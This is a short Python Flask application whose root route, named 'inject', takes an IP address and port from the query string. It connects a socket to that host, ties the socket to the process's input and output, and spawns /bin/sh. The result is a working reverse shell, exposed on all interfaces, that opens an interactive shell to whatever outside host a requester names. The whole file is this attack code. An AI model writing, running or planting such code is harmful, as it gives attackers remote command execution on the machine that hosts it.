from flask import Flask, request
import sys,socket,os,pty;

app = Flask(__name__)

@app.route('/')
def inject():
    ip_address = request.args.get('ip')
    port = request.args.get('port')
    if ip_address:
        s = socket.socket()
        try:
            s.connect((ip_address, int(port)))
            print("Connection successful!")
            [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
            pty.spawn("/bin/sh")
        except ConnectionRefusedError:
            print("Connection refused. Make sure the service is running.")
        return f'Connecting to {ip_address}:{port}'
    else:
        return 'Good way to pretend you are not a hacker!'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
